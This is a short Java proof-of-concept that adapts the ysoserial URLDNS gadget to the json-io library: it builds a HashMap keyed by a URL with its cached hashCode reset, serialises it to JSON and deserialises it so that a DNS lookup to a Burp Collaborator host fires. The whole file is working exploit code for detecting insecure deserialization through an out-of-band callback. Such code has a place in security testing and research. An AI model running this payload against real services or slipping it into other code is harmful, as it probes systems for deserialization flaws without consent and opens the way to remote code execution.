import com.cedarsoftware.util.io.JsonReader;
import com.cedarsoftware.util.io.JsonWriter;
import ysoserial.payloads.util.Reflections;

import java.net.URL;
import java.util.HashMap;

public class Main {

    public static void main(String[] args) throws Exception {
        //User user1 = new User("Benjamin", "Watson");
        String url = "http://5g2.2or5urpiytc429mi2boqibead1jr7g.burpcollaborator.net";
        String out = JsonWriter.objectToJson(getObject(url));
        test(out.replaceAll("5g2","test"));
        System.out.println(out);
    }

    public static Object getObject(final String url) throws Exception {
        HashMap ht = new HashMap(); // HashMap that will contain the URL
        URL u = new URL(url); // URL to use as the Key
        ht.put(u, url); //The value can be anything that is Serializable

        Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

        return ht;
    }

    public static void test(final String jsonIO_str)
    {
        JsonReader.jsonToJava(jsonIO_str);
    }
}
